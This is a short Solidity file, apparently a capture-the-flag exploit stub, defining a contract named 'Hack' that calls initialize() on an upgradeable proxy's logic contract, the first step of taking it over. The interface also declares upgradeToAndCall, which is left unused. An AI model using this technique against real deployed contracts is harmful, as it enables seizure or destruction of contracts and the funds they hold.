// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

interface target {
    function initialize() external;
    function upgradeToAndCall(address, bytes memory) external;
}

contract Hack {
    address logic;

    constructor(address _logic) public{
        logic = _logic;
    }
    
    
    function  callinitialize() public {
        (bool success, ) = logic.call(abi.encodeWithSignature('initialize()'));
        require(success, 'initalize call failed');
    }

}

